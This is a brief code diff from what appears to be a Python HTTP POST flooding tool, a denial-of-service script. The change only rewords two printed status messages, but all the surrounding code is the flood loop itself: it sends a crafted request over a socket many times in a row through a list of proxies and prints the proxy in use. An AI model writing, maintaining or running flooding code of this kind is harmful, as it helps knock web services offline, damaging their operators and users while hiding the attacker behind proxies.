@@ -239,7 +239,7 @@ def post():
 			else:
 				pass
 			s.send(str.encode(request))
-			print ("[*] 'Post' Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] HTTP Post Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for y in range(multiple):
 					s.send(str.encode(request))
@@ -256,7 +256,7 @@ def post():
 				else:
 					pass
 				s.send(str.encode(request))
-				print("[*] 'Post' Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
+				print ("[*] HTTP Post Flooding from  --> "+str(proxy[0])+":"+str(proxy[1]))
 				try:
 					for y in range(multiple):
 						s.send(str.encode(request))
